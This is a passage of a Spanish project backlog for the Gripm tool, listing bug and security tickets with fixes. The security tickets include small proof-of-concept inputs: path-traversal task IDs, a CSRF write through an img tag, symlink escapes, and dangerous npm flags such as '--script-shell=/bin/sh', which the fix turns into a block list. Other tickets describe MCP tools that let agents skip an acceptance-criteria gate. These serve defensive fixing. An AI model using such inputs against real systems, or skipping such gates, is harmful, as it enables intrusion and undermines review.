import fs from 'node:fs';
// Simulación de interrupción forzada a mitad de escritura directa
const target = './test-corrupt-task.md';
fs.writeFileSync(target, 'contenido previo valioso');
try {
  const fd = fs.openSync(target, 'w');
  // Proceso abortado antes de transferir bytes
  process.kill(process.pid, 'SIGKILL');
} catch {}
// Resultado: test-corrupt-task.md queda con 0 bytes de tamaño
```

**Criterios de Aceptación:**
- [x] #1 Se implementa un helper canónico `atomicWriteFileSync(filePath, content)` que escribe a un archivo temporal `.tmp.[pid].[timestamp]`, fuerza el vaciado físico a disco (`fs.fsyncSync`) y ejecuta `fs.renameSync` para reemplazar el archivo destino de forma atómica
- [x] #2 `saveBacklogMdItem()` y `writeProjectBacklog()` en `server/services/storage.ts` utilizan la función de escritura atómica
- [x] #3 `saveRegistryFile()` en `scripts/registryConfig.js` utiliza la función de escritura atómica
- [x] #4 El servidor MCP en `scripts/mcp-server.ts` utiliza la función de escritura atómica para la creación y actualización de tareas
- [x] #5 Un test de stress simula interrupciones y verifica que el archivo de destino nunca queda con 0 bytes ni en estado parcialmente escrito

---

#### [DEV-292] Seguridad en Daemon Local: Sanitización de Path Traversal en tareas y blindaje de endpoints
- **Prioridad**: `high` | **Tipo**: `security`

Corrección de vulnerabilidades de seguridad críticas en el servidor backend local de Gripm: escape de directorio (Path Traversal) en la generación de nombres de tareas, mutación de archivos sin validación CSRF vía HTTP `GET`, fuga de contención por enlaces simbólicos y caídas fatales del proceso Node por sockets SSE huérfanos.

### Problemas identificados y reproducibles:

1. **Path Traversal en `code` de tareas:**
   En `scripts/backlogMdParser.ts:741`, `generateTaskFilename(id, title)` solo sanitiza caracteres no válidos en el título, pero deja intacto el `id`:
   ```typescript
   const cleanId = (id || 'TASK').trim().toUpperCase().replace(/--+/g, '-');
   return `${cleanId} - ${cleanTitle || 'Task'}.md`;
   ```
   Si se envía `POST /api/items` con `{ "code": "../../../payload" }`, `path.join(tasksDir, targetFilename)` resuelve fuera de `backlog/tasks/` y escribe el archivo en la raíz del repositorio o fuera de él.
2. **Mutación de disco en endpoint `GET` sin protección CSRF:**
   En `server/routes/api.ts:832-838`, `GET /api/projects/:id/export-monolithic-md?save=true` escribe físicamente en `BACKLOG.md`. Las peticiones `GET` emitidas desde etiquetas HTML (`<img src="...">`) por una web externa no envían cabecera `Origin` y son autorizadas por el middleware de seguridad, permitiendo sobrescribir archivos locales sin interacción del usuario.
3. **Crash Fatal por evento `EPIPE` no capturado en SSE:**
   En `server/sse/sseManager.ts:10-16`, `broadcastSse` escribe en `http.ServerResponse`. En Node.js, si el cliente desconecta abruptamente, el stream emite un evento `'error'` asíncrono. Como no hay listener `res.on('error', ...)`, Node.js aborta el proceso completo con excepción fatal.
4. **Fuga de contención en `/api/fs/browse` con Enlaces Simbólicos:**
   En `server/services/fsExplorer.ts:56`, se evalúa `isPathContained` sobre la ruta sintáctica antes de resolver `fs.realpathSync`. Si un enlace simbólico en `/tmp` apunta a `/`, permite explorar todo el disco.

### Script de Reproducción Inmediata (PoC):

```javascript
import path from 'node:path';
import { generateTaskFilename } from './scripts/backlogMdParser.ts';

const filename = generateTaskFilename('../../../evil', 'Payload');
const resolved = path.resolve('backlog/tasks', filename);
console.assert(!resolved.startsWith(path.resolve('backlog/tasks')), 'FALLO: El archivo escapó de tasksDir');
```

**Criterios de Aceptación:**
- [x] #1 `generateTaskFilename()` en `scripts/backlogMdParser.ts` sanitiza estrictamente el identificador `id`, eliminando cualquier barra (`/`, `\`), punto relativo (`..`) o carácter fuera de `[a-zA-Z0-9_-]`
- [x] #2 La funcionalidad de guardado en disco (`?save=true`) se remueve del método `GET` en `/api/projects/:id/export-monolithic-md` y se traslada a un método `POST` con validación estricta de `Origin` y `Content-Type: application/json`
- [x] #3 `handleSseRoute()` en `server/sse/sseManager.ts` registra listeners `res.on('error', ...)` y `req.on('error', ...)` para liberar los sockets y limpiar temporizadores sin provocar un crash fatal de Node.js ante desconexiones intempestivas
- [x] #4 `isAllowedBrowsePath()` en `server/services/fsExplorer.ts` resuelve `fs.realpathSync` **antes** de verificar la contención con `isPathContained`, bloqueando el bypass mediante symlinks
- [x] #5 La suite de pruebas de seguridad aprueba limpiamente (`node scripts/test-api-security.js`)

---

#### [DEV-293] Gobernanza de Calidad: Erradicación de fabricación de ACs y auto-promoción a ready en backlog sync
- **Prioridad**: `high` | **Tipo**: `bug`

Corrección en el script de sincronización y verificación de backlog (`scripts/verify-backlog-sync.js`) para erradicar la alteración ilegítima de estados y la falsificación automática de criterios de aceptación (`- [ ]` ➔ `- [x]`).

### Problemas identificados y reproducibles:

1. **Fabricación automática de criterios de aceptación cumplidos:**
   En `scripts/verify-backlog-sync.js:236-242`, si una tarea está en estado `done` pero tiene criterios sin tildar (`- [ ]`), ejecutar `npm run backlog:sync` (modo `--fix`) ejecuta:
   ```javascript
   const fixedAcBlock = acBlock.replace(/-\s*\[ \]/g, '- [x]');
   ```
   Tildando mecánicamente todos los criterios como aprobados sin ninguna verificación ejecutable. Esto viola directamente la regla de seguridad `SEC-02` y falsea la trazabilidad histórica de pruebas.
2. **Auto-promoción ilegítima a `ready` saltando `review` y QA:**
   En `scripts/verify-backlog-sync.js:220-228`, si todos los ACs de una tarea en `doing` están tildados, el modo `--fix` cambia su estado automáticamente a `status: ready`.
   Esto viola la Invariante Fundamental de `STATE_MACHINE.md` y `AGENTS.md` (el paso a `ready` es potestad exclusiva del rol QA tras auditar bajo la Pirámide de Verificación).
3. **Diffs artificiales de Git por fecha diaria en `BACKLOG.md`:**
   En `scripts/backlogMdParser.ts:759`, `generateMonolithicBacklogMd` estampa `> Consolidado generado el ${now} por gripm ⚡`. Ejecutar el sync al día siguiente sin cambios en tareas produce un commit innecesario por la fecha.

### Script de Reproducción Inmediata (PoC):

```bash
# Crear tarea en done con AC pendiente
cat << 'EOF' > backlog/tasks/DEV-997\ -\ Test\ Sync.md
---
id: DEV-997
title: Tarea Test
status: done
---
[marcador H2 Acceptance Criteria]
- [ ] Criterio no probado
EOF

node scripts/verify-backlog-sync.js --fix
# En el estado previo, el archivo pasaba a tener "- [x] Criterio no probado" falsificado
```

**Criterios de Aceptación:**
- [x] #1 `verify-backlog-sync.js` en modo `--fix` jamás altera checkboxes `- [ ]` a `- [x]` en tareas marcadas como `done`; en su lugar, reporta una advertencia o error exigiendo verificación real o reclasificación del estado
- [x] #2 `verify-backlog-sync.js` en modo `--fix` jamás auto-promociona tareas de `doing` a `ready`; la transición formal a `ready` se preserva como gate manual/exclusivo del rol QA
- [x] #3 `generateMonolithicBacklogMd` omite marcas de tiempo volátiles que generen git churn diario cuando el contenido de las tareas no ha variado
- [x] #4 `npm run backlog:check` y `npm run backlog:sync` respetan estrictamente la State Machine sin alterar el contenido semántico de las tareas

---

#### [DEV-294] Prevención de Stale Closures en App.tsx y Sincronización Funcional con SSE
- **Prioridad**: `medium` | **Tipo**: `bug`

Corrección de condiciones de carrera y pérdida silenciosa de tareas en el cliente React (`src/App.tsx`) causadas por el uso de copias obsoletas en closures (`setBoardData({ ...boardData, items })`) en lugar de mutaciones funcionales ante la llegada concurrente de eventos SSE.

### Problemas identificados y reproducibles:

1. **Stale Closure en guardado de tareas:**
   En `src/App.tsx:848-856`:
   ```tsx
   const handleSaveItem = useCallback(async (itemData) => {
     if (!boardData) return;
     const updated = await updateItem(itemData.id, itemData);
     setBoardData({
       ...boardData, // ¡Referencia capturada al momento de invocar el handler!
       items: boardData.items.map(...)
     });
   }, [boardData]);
   ```
2. **Eliminación silenciosa de tareas creadas concurrentemente:**
   Si un usuario tiene el modal de edición abierto y en segundo plano un agente de IA o terminal crea una tarea nueva (`DEV-101`), el evento SSE actualiza `boardData` en la UI. Al hacer clic en "Guardar" en el modal, la promesa `updateItem()` se resuelve y ejecuta `setBoardData` utilizando la versión vieja capturada en el closure, **borrando inmediatamente la tarea recién llegada de la pantalla del usuario**.
3. Idéntico patrón defectuoso ocurre en:
   - `handleUpdateStatus` (`src/App.tsx:527`)
   - `handleUpdatePriority` (`src/App.tsx:578`)
   - `handleCreateProject` (`src/App.tsx:908`)

### Escenario de Reproducción:

1. Abrir la UI de Gripm en el navegador.
2. Abrir el modal de edición de una tarea existente.
3. Desde la terminal, crear una nueva tarea con `node scripts/gripm-cli.ts create --title "Tarea Concurrente"`.
4. Verificar que la tarjeta aparece en el Kanban vía SSE.
5. Guardar la tarea abierta en el modal en la UI.
6. En el estado actual, "Tarea Concurrente" desaparece del tablero.

**Criterios de Aceptación:**
- [x] #1 Todas las invocaciones a `setBoardData` en `src/App.tsx` utilizan el patrón de actualización funcional (`setBoardData(prev => ...)`), garantizando que operan siempre sobre la versión más reciente del estado en memoria
- [x] #2 Los eventos de actualización en vivo (`subscribeToBoardEvents`) no son sobrescritos ni descartados por operaciones de guardado pendientes o concurrentes
- [x] #3 Si un ítem en edición es modificado externamente en disco mientras su modal está abierto, la UI advierte del cambio o actualiza `mtime` para prevenir conflictos 409 inesperados
- [x] #4 La suite de pruebas de UI y Smoke Tests aprueban limpiamente (`npm run test:ui`)

---

#### [DEV-295] Saneamiento del Servidor MCP: Prevención de procesos zombies y blindaje de JSON-RPC
- **Prioridad**: `medium` | **Tipo**: `bug`

Endurecimiento del servidor Model Context Protocol (`scripts/mcp-server.ts` y `bin/gripm-mcp.js`) para evitar procesos huérfanos en segundo plano, roturas del canal de comunicación stdio con agentes de IA (Cursor, Claude, Antigravity) y desincronizaciones entre el código fuente TypeScript y el binario empaquetado.

### Problemas identificados y reproducibles:

1. **Procesos Zombie por falta de listeners de cierre en `stdin`:**
   En `scripts/mcp-server.ts:1820`, el servidor escucha líneas mediante `readline`, pero **no registra ningún listener para `process.stdin.on('close')`, `'end'`, `SIGINT` ni `SIGTERM`**. Cuando un cliente LLM desconecta o termina la sesión, el proceso Node.js permanece vivo consumiendo memoria y CPU si existen temporizadores activos (como `checkForUpdates`).
2. **Rotura de protocolo JSON-RPC por enrutamiento fallido en CLI:**
   En `bin/gripm.js:148-182`, la detección de MCP evalúa rígidamente `args[0] === 'mcp'`. Si un cliente o script invoca `gripm --repo /ruta mcp`, `args[0]` es `'--repo'`. El ejecutable no inicia MCP, sino que inicia el servidor web e imprime texto plano y banners ASCII en `stdout`, reventando la conexión JSON-RPC del cliente.
3. **Peligro de salida en `readline`:**
   En `scripts/mcp-server.ts:1810`, se declara `output: process.stdout` en `readline.createInterface`. En un transporte stdio de MCP, `output` debe ser nulo para evitar que secuencias de escape del terminal se filtren en la salida.
4. **Desfase silencioso de binario compilado:**
   El binario commiteado `bin/gripm-mcp.js` no cuenta con una verificación en pre-commit hook que valide si está sincronizado con los cambios en `scripts/mcp-server.ts`.

### Script de Reproducción Inmediata (PoC):

```bash
# Simular invocación con banderas previas
node bin/gripm.js --repo . mcp
# En el estado actual, imprime "gripm v... listo / Tablero: http://..." en stdout en lugar de responder a JSON-RPC
```

**Criterios de Aceptación:**
- [x] #1 `scripts/mcp-server.ts` registra manejadores explícitos para `process.stdin.on('close')`, `process.stdin.on('end')`, `SIGINT` y `SIGTERM` para terminar el proceso limpiamente de inmediato
- [x] #2 `bin/gripm.js` analiza los argumentos de forma no posicional, reconociendo el subcomando `mcp` sin importar si está precedido por banderas como `--repo` o `-r`
- [x] #3 `readline.createInterface` en `scripts/mcp-server.ts` omite `output: process.stdout` para blindar la pureza del canal JSON-RPC
- [x] #4 Un check en `scripts/verify-changes.js` compila en memoria `mcp-server.ts` y verifica que `bin/gripm-mcp.js` coincida exactamente, abortando el commit si el binario está desactualizado
- [x] #5 La suite de pruebas de MCP aprueba limpiamente (`node scripts/verify-mcp-binary.js`)

---

#### [DEV-298] Gobernanza de CI/CD: Gate de verificación previa obligatoria en pipeline de publish a npm
- **Prioridad**: `p2` | **Tipo**: `tech_debt`

Garantizar que ningún paquete de `@gripm/board` sea emitido al registro público de npm sin que la suite integral de CI (`ci.yml`, incluyendo la matriz multi-OS de Ubuntu, macOS y Windows, y los smoke tests de navegador Playwright) haya finalizado exitosamente sobre el commit del release.

### Diagnostico del Defecto de Arquitectura:
El pipeline previo ejecutaba la publicación de forma desacoplada y en paralelo:
1. Al pushear el tag, se disparaba un workflow separado de publicación que corría solo en Ubuntu.
2. En caso de fallas que solo emergían en runners de Windows/macOS o en el smoke test de UI, el paquete se publicaba a npm antes de que CI terminara de detectar el problema, dejando a los usuarios con una versión inmutable defectuosa en npm.
3. El sondeo paralelo vía API introducía esperas ociosas de runners y riesgos de rate limits.

### Solucion Tecnica Implementada:
- **Orquestacion Nativa de 3 Fases en `ci.yml`:**
  1. Fase 1: Matriz de verificación estricta (`verify`) en 6 runners (Ubuntu, macOS, Windows en Node 22.6 y 22.x).
  2. Fase 2: Smoke test de navegador Playwright (`ui-smoke`) sobre bundle de producción.
  3. Fase 3: Job de publicación (`publish`) bloqueado físicamente bajo `needs: [verify, ui-smoke]` y restringido a la rama `main`.
- **Certificacion Idempotente:**
  El job consulta `npm view @gripm/board@<version>`: si la versión ya existe, concluye de inmediato sin publicar.
- **Auto-Tagging y GitHub Release Oficial:**
  Tras la publicación exitosa en npmjs con provenance, el pipeline genera automáticamente el tag anotado `vX.Y.Z` y la GitHub Release correspondiente con las notas de `releases.json`.

**Criterios de Aceptación:**
- [x] #1 AC #1: Pipeline de release integrado bajo orquestación nativa (`needs: [verify, ui-smoke]`) garantizando que ningún paquete sea emitido a npm sin que la suite multi-plataforma completa esté 100% aprobada.
- [x] #2 AC #2: Si algún check de CI falla (en Ubuntu, Windows, macOS o browser smoke test), el engine de GitHub Actions cancela/omite el job de publicación automáticamente, impidiendo cualquier emisión a npm.
- [x] #3 AC #3: Detección automática e idempotente de versión en npmjs para omitir el despliegue en commits regulares a main.
- [x] #4 AC #4: Creación automática del tag anotado de Git y de la GitHub Release oficial tras la publicación exitosa en npmjs.

---

#### [DEV-299] Arquitectura de Persistencia: Motor Unificado de Backlog (BacklogService) y Erradicación de Duplicación
- **Prioridad**: `urgent` | **Tipo**: `architecture`

Creación de una capa de servicio unificada y canónica (`server/services/backlogService.ts`) que centralice el 100% de la lógica de lectura, mutación, validación de State Machine, Gatekeeper de certificación, filtrado de tareas borradas (`isDeleted`), persistencia atómica y reconciliación de metadatos, erradicando la triplicación divergente actual entre `server/services/storage.ts`, `scripts/mcp-server.ts` y `scripts/gripm-cli.ts`.

### Diagnóstico de la Causa Raíz:

Actualmente, el producto mantiene tres implementaciones desconectadas para operar sobre las tareas:
1. **`server/services/storage.ts`:** Usado por los endpoints HTTP del cockpit web.
2. **`scripts/mcp-server.ts`:** Usado por agentes LLM (Cursor, Claude Code, Antigravity) vía protocolo stdio.
3. **`scripts/gripm-cli.ts`:** Usado por scripts y terminal.

Esta fragmentación es la causa raíz de regresiones sistemáticas en cada release:
- **Bypass del Gatekeeper:** `gripm_update_task` valida criterios de aceptación antes de pasar a `ready`/`done`, pero `gripm_bulk_update_tasks` y `gripm-cli.ts --update-status` permiten cambiar estados sin validar ACs ni emitir auditoría `SEC-09`.
- **Divergencia de State Machine:** Cuando `DEV-293` eliminó la auto-promoción ilegítima a `ready` en `verify-backlog-sync.js`, la función `gripm_sync_backlog` en `mcp-server.ts:1533-1538` quedó desincronizada y siguió mutando tareas de `doing` a `ready`.
- **Efectos secundarios en lecturas `GET`:** `readProjectBacklog()` en `storage.ts:311-325` muta `backlog/sprints.json` y cierra sprints automáticamente al consultar `GET /api/data`, violando la soberanía del PO (`AGENTS.md` §2) y disparando bucles SSE.
- **Fuga de tareas en papelera:** `mcp-server.ts:394-445`, `gripm-cli.ts:79-194` y `api.ts:820` no filtran `!task.isDeleted`, exponiendo ítems descartados a agentes y ensuciando estadísticas.
- **Rutas de escritura no atómicas:** A pesar de `DEV-291`, 8 llamadas en `registry.ts`, `api.ts`, `gripm-cli.ts` y `updateChecker.js` siguen usando `fs.writeFileSync` truncante.

### Solución Arquitectónica Profunda:

Diseñar e implementar `server/services/backlogService.ts` como la única interfaz de dominio del sistema:
- **Operaciones Atómicas Centralizadas:** `getTask(projectId, taskId)`, `listTasks(projectId, filters)`, `createTask(projectId, data)`, `updateTask(projectId, taskId, updates, options)`, `bulkUpdateTasks(projectId, patches, options)`, `deleteTask(projectId, taskId, options)`, `syncBacklog(projectId, options)`.
- **Gobernanza Unificada:**
  - El Gatekeeper de certificación de ACs se ejecuta obligatoriamente en `updateTask` y `bulkUpdateTasks` independientemente de si la llamada proviene de HTTP, MCP o CLI.
  - El filtro `!task.isDeleted` es estricto por defecto en todas las consultas y exportaciones, salvo solicitud explícita (`includeDeleted: true`).
  - Cero escrituras en operaciones de solo lectura (`getTask`, `listTasks`, `readProjectBacklog`).
  - El 100% de las escrituras se realizan mediante `atomicWriteFileSync` de `server/services/atomicWrite.ts`.
  - Reemplazo y delegación de `storage.ts`, `mcp-server.ts` y `gripm-cli.ts` hacia `backlogService`.

**Criterios de Aceptación:**
- [x] #1 Se implementa `server/services/backlogService.ts` como módulo canónico de dominio que encapsula lectura, escritura atómica, validaciones y reconciliación de tareas y releases
- [x] #2 `server/services/storage.ts`, `scripts/mcp-server.ts` y `scripts/gripm-cli.ts` delegan su lógica de dominio en `backlogService`, eliminando código duplicado
- [x] #3 `gripm_bulk_update_tasks` y `gripm-cli.ts --update-status` aplican estrictamente la validación del Gatekeeper (bloqueo a `ready`/`done` con ACs pendientes sin `force: true`) idéntica a `gripm_update_task`
- [x] #4 `gripm_sync_backlog` en MCP deja de auto-promocionar tareas a `ready`, limitándose a emitir advertencias de calidad y escribiendo `BACKLOG.md` únicamente cuando hay cambios reales o `autoFix: true`
- [x] #5 `readProjectBacklog` y las consultas de lectura no ejecutan ninguna mutación física en disco ni auto-cierre de sprints
- [x] #6 Las tareas marcadas con `isDeleted: true` quedan excluidas por defecto de `gripm_list_tasks`, `gripm_get_stats`, listados CLI y exportaciones de `BACKLOG.md`
- [x] #7 Todas las escrituras residuales identificadas (`registry.ts:212`, `api.ts:787, 1008, 1178, 1286`, `gripm-cli.ts:325, 460, 478`) migran a `atomicWriteFileSync`
- [x] #8 Una suite de pruebas de integración verifica paridad 1:1 de comportamiento entre llamadas API REST, MCP y CLI

---

#### [DEV-300] Parser de Integridad Total: Tokenizador Formal, Idempotencia Round-Trip y Resiliencia Markdown
- **Prioridad**: `urgent` | **Tipo**: `architecture`

Reingeniería integral del parser y serializador de tareas (`scripts/backlogMdParser.ts`) mediante un scanner determinista de bloques y tokenizador formal de YAML/Markdown que garantice idempotencia total en operaciones de lectura-escritura (round-trip), erradicando definitivamente la mutilación de código, la pérdida de secciones y la corrupción progresiva de caracteres escapados.

### Diagnóstico de la Causa Raíz:

El parser actual se basa en expresiones regulares heurísticas y particiones por líneas (`split`) que fallan ante estructuras sintácticas válidas de Markdown y YAML:
1. **Pérdida de Secciones por Ausencia de Fallback:**
   En `parseBacklogMd`, las secciones `Acceptance Criteria`, `Implementation Plan`, `Implementation Notes` y `Final Summary` buscan encabezados `## Header` sobre bloques a los que `extractSectionBlock` ya les removió el encabezado, descartando las secciones si no tienen marcadores HTML `<!-- SECTION:... -->`. Esto provocó en `v1.5.0` la pérdida física de notas de implementación en 5 tareas.
2. **Corrupción Progresiva de Comillas y Barras (`\"` ➔ `\\\"`):**
   `serializeBacklogMd` serializa cadenas con `JSON.stringify()`, pero `parseBacklogMd` limpia comillas con `.replace(/^['"]|['"]$/g, '')` en lugar de un unquote simétrico. Títulos o notas con `"` o `\` multiplican barras en cada guardado.
3. **Inyección en YAML Frontmatter:**
   Campos como `id`, `type`, `createdDate` o claves dinámicas de `rawExtraFrontmatter` se interpolan sin sanitizar caracteres de salto de línea (`\n`), permitiendo inyectar directivas YAML arbitrarias.
4. **Falsos Positivos de Encabezados dentro de Código:**
   Cuando una sección opcional no existe, el fallback a `bodyContent` busca encabezados con regex simple, cayendo en falsos positivos si un ejemplo de código en `## Description` menciona `## Acceptance Criteria` o `## Implementation Notes`.
5. **Omisión de Estados en el Consolidado:**
   `generateMonolithicBacklogMd` omite el estado canónico `'cancelled'` en la tabla de exportación a `BACKLOG.md`.

### Solución Arquitectónica Profunda:

- **Scanner Determinista de Secciones:**
  Implementar un parser de dos fases:
  1. *Fase Frontmatter:* Extracción y parseo seguro con soporte para BOM (`\uFEFF`), validación de claves contra `/^[a-zA-Z0-9_-]+$/` y función simétrica `unquoteYamlScalar(raw)` que desescape `JSON.parse` y comillas simples limpiamente.
  2. *Fase Secciones CommonMark:* Escaneo de un solo paso que identifique todos los fences de código cercados (``` o ~~~ respetando indentación y longitudes) y extraiga con límites precisos las secciones `Description`, `Acceptance Criteria`, `Implementation Plan`, `Implementation Notes` y `Final Summary`, tanto si usan marcadores HTML como si usan solo encabezados Markdown estándar.
- **Idempotencia de Round-Trip:**
  Garantizar que `serialize(parse(content)) === content` para cualquier archivo canónico sin diffs fantasma ni mutilación de saltos de línea.
- **Inclusión de `cancelled`:**
  Asegurar que `generateMonolithicBacklogMd` agrupe y exporte tareas en estado `cancelled`.

**Criterios de Aceptación:**
- [x] #1 `parseBacklogMd` extrae íntegramente las 5 secciones estándar (`Description`, `Acceptance Criteria`, `Implementation Plan`, `Implementation Notes`, `Final Summary`) independientemente de si poseen o no marcadores HTML `<!-- SECTION:... -->`
- [x] #2 Ningún encabezado H2 (`## ...`) o marcador HTML ubicado dentro de bloques de código cercados (``` o ~~~) es interpretado como delimitador estructural
- [x] #3 Se implementa `unquoteYamlScalar` determinista, eliminando la multiplicación de barras invertidas (`\"` ➔ `\\\"`) y preservando comillas y caracteres especiales en títulos y listas
- [x] #4 Las claves y valores de YAML frontmatter se validan y sanitizan para impedir inyecciones de saltos de línea o directivas no autorizadas
- [x] #5 `parseBacklogMd` soporta archivos con UTF-8 BOM (`\uFEFF`) y archivos sin salto de línea final tras el cierre `---`
- [x] #6 `generateMonolithicBacklogMd` incluye las tareas en estado `cancelled` bajo su sección correspondiente en `BACKLOG.md`
- [x] #7 Una suite de pruebas de ida y vuelta (round-trip) con 50 casos borde de Markdown/YAML complejos verifica 100% de preservación de bytes y fidelidad semántica

---

#### [DEV-301] Concurrencia y Sincronización: Protocolo Optimista Real Mtime y Batching Atómico en API
- **Prioridad**: `high` | **Tipo**: `bug`

Rediseño del protocolo de concurrencia optimista y sincronización en tiempo real entre el servidor y el cliente React: corrección del mecanismo de bloqueo por `mtime` en disco, eliminación de falsos positivos/negativos de colisión `409 Conflict`, y reemplazo de tormentas de peticiones HTTP N+1 por operaciones en lote atómicas (`bulkUpdateItems`).

### Diagnóstico de la Causa Raíz:

1. **Desactivación Silenciosa del Guard 409 (`App.tsx` vs `ItemModal.tsx`):**
   Al recibir eventos SSE `backlog_changed`, `App.tsx:337` actualiza `editingItem.mtime` al nuevo timestamp del disco para "evitar errores 409". Sin embargo, `ItemModal` no recarga sus 35 campos de formulario si el modal ya está abierto. Al pulsar "Guardar", envía el `mtime` nuevo pero con los datos viejos en pantalla, sobrescribiendo silenciosamente los cambios que un agente o usuario externo hizo en disco.
2. **Margen Ciego de 1.000 ms en el Backend:**
   En `server/routes/api.ts:278`, la verificación `if (existing.mtime > body.expectedMtime + 1000)` ignora deliberadamente colisiones concurrentes dentro de un segundo. Este hack se introdujo porque `api.ts:337` devolvía `updatedItem.mtime = Date.now()` (hora de CPU) en vez de `fs.statSync(targetFilePath).mtimeMs` (hora del sistema de archivos), provocando desfasajes artificiales.
3. **Tormenta N+1 y Corrupción de Orden en Bulk Actions:**
   Reordenar una tarea en `App.tsx:660-672` o mover tareas seleccionadas en `SprintView.tsx:680-721` ejecuta bucles con decenas de llamadas individuales `PUT /api/items/:id`. Además, como `onReorderItem` lee `boardData.items` desde un closure obsoleto en cada iteración del bucle, los órdenes se computan con datos viejos y corrompen la secuencia de las tareas anteriores.
4. **Bypass del Estado en Modo Sandbox:**
   Componentes como `KanbanBoard` y `SprintView` importan y llaman directamente a `updateItem()` desde `src/api.ts` sin notificar a `App.tsx`. En modo Sandbox (`gripm.vercel.app`), donde SSE es un no-op, la interfaz no se entera del cambio hasta que el usuario recarga la página.

### Solución Arquitectónica Profunda:

- **Protocolo Mtime Determinista:**
  - `saveBacklogMdItem` y `PUT /api/items/:id` leen y devuelven el valor exacto `Math.round(fs.statSync(filePath).mtimeMs)`.
  - La verificación de conflicto en `api.ts` se vuelve exacta (`existing.mtime > body.expectedMtime`), erradicando la ventana ciega de 1.000 ms.
  - En `App.tsx`, no se pisa `prevEditing.mtime` en segundo plano. Si el disco cambia mientras el modal está abierto, `ItemModal` muestra un banner contextual: *"Esta tarea fue modificada externamente en disco - [Comparar / Recargar]"*, preservando el bloqueo optimista 409 si el usuario decide guardar sobre una versión desfasada.
- **Batching Atómico Universal:**
  - Migrar todas las operaciones de reordenamiento (`handleReorderBacklogItem`), finalización de sprint (`handleCompleteSprint`) y acciones masivas en `SprintView` para que utilicen el endpoint ya existente `POST /api/items/bulk` en **una única transacción HTTP**, con un único `setBoardData` funcional y una única notificación SSE.
  - Asegurar que todas las mutaciones pasen por los handlers de `App.tsx` para sincronización inmediata en modo Sandbox y HTTP.

**Criterios de Aceptación:**
- [x] #1 `PUT /api/items/:id` devuelve el `mtime` exacto del archivo en disco (`fs.statSync().mtimeMs`) y aplica validación estricta de conflicto sin márgenes arbitrarios de 1.000 ms
- [x] #2 `src/App.tsx` no sobrescribe silenciosamente `expectedMtime` cuando una tarea en edición cambia en disco; `ItemModal` advierte de la modificación externa permitiendo al usuario decidir recargar o resolver el conflicto
- [x] #3 `handleReorderBacklogItem`, `handleCompleteSprint` y todas las acciones masivas de `SprintView` ejecutan una única llamada `bulkUpdateItems` por operación, eliminando bucles N+1 de peticiones individuales
- [x] #4 Las mutaciones disparadas desde menús contextuales en `KanbanBoard` y `SprintView` actualizan el estado de `App.tsx`, garantizando consistencia inmediata en modo Sandbox y modo Local
- [x] #5 El cambio de proyecto activo en `App.tsx` espera a la confirmación de la API antes de cargar datos y mantiene una conexión SSE persistente sin destruirla innecesariamente

---

#### [DEV-302] Blindaje Integral de Seguridad: Daemon Local, Scoping Multi-Proyecto, IPv6 y Gatekeeper
- **Prioridad**: `high` | **Tipo**: `security`

Cierre sistemático de vulnerabilidades de seguridad y robustecimiento de la superficie de ataque del daemon local y el servidor MCP: soporte de loopback IPv6, contención estricta de symlinks con resolución de ancestros, aislamiento riguroso entre proyectos para prevenir mutaciones cruzadas por colisión de ID, blindaje del Gatekeeper de ejecución y sanitización de rutas HTTP.

### Diagnóstico de la Causa Raíz:

1. **Rechazo de Loopback IPv6 (`[::1]`):**
   En `server/middleware/security.ts:62`, `(req.headers.host || '').split(':')[0]` convierte `[::1]:4100` en `'['`, fallando la comprobación `isLoopbackHost` y devolviendo `403 Forbidden` a cualquier cliente o navegador configurado con pila dual IPv6 local.
2. **Evasión de Allowlist en el Gatekeeper de Certificación (`verifyCommand`):**
   En `scripts/mcp-server.ts:260-384`, `validateVerifyCommand` valida el comando base (`npm test`, `npx vitest`), pero admite cualquier argumento que coincida con caracteres alfanuméricos y símbolos. Flags como `--prefix=/tmp/evil`, `--script-shell=/bin/sh`, `--config=/tmp/malicious.js` o `-c` permiten ejecutar código arbitrario fuera del repositorio.
3. **Bypass de Contención por Symlinks en Rutas Inexistentes y en MCP:**
   - En `server/services/fsExplorer.ts:57-62`, si se consulta una ruta que aún no existe físicamente (`/allowed/symlink_a_raiz/archivo_nuevo`), `fs.realpathSync` falla con `ENOENT` y el bloque `catch` realiza una comprobación sintáctica sobre la ruta sin resolver, permitiendo escapar de los límites permitidos.
   - En `scripts/mcp-server.ts:148`, `isAllowedBrowsePath` evalúa `isPathContained` **antes** de resolver `fs.realpathSync`, permitiendo que enlaces simbólicos dentro de `cwd` sorteen la contención.
4. **Colisión de IDs entre Proyectos (Mutación Cruzada):**
   En `server/routes/api.ts:270-420` (`PUT`, `PATCH`, `DELETE`) y en `mcp-server.ts:1050/1160`, las operaciones buscan tareas iterando `registry.projects` desde el índice `0` sin filtrar por `projectId`. En un entorno con varios proyectos registrados, si dos repositorios tienen una tarea `DEV-001`, editar o borrar `DEV-001` en el Proyecto 2 muta o borra la tarea del Proyecto 1.
5. **Ruteo con `req.url` en lugar de `pathname` y Parámetros no Sanitizados:**
   Más de 15 endpoints en `api.ts` comparan directamente `req.url` (incluyendo query strings) o usan `url.split('/')[3]` sin `decodeURIComponent`. Además, `POST /api/import` no valida `docsPath` y `POST /api/projects` acepta `backlogDir` con secuencias `../`.

### Solución Arquitectónica Profunda:

- **Middleware de Seguridad Robusto:**
  - Parseo RFC-compliant de la cabecera `Host` soportando formato IPv6 `[::1]` y validación de `Origin` / `Sec-Fetch-Site` en todos los métodos de mutación (`POST`, `PUT`, `DELETE`, `PATCH`).
- **Gatekeeper Hardened:**
  - Rechazar cualquier argumento que comience con `--prefix`, `--config`, `-c`, `--script-shell`, `--eval`, `-e`, `--import`, `--loader` o contenga secuencias relativas `..` o barras absolutas.
  - Ejecutar verificación mediante argumentos estructurados sin invocación de shell en entornos POSIX.
- **Contención de Filesystem con Resolución de Ancestros:**
  - En `isAllowedBrowsePath`, si el archivo objetivo no existe, resolver iterativamente `fs.realpathSync` sobre su directorio padre existente más cercano antes de evaluar la contención. Unificar esta función en un solo módulo.
- **Scoping Estricto por `projectId`:**
  - Exigir o resolver prioritariamente el proyecto activo (`body.projectId || query.projectId || activeProjectId`) en todos los endpoints y herramientas MCP, garantizando que ninguna operación sobre `DEV-XXX` afecte a un proyecto ajeno.
- **Sanitización de Ruteo:**
  - Extraer `pathname` mediante `new URL(req.url, 'http://localhost')` en todos los manejadores de `server/routes/api.ts`, y validar contención estricta en `docsPath` y `backlogDir`.

**Criterios de Aceptación:**
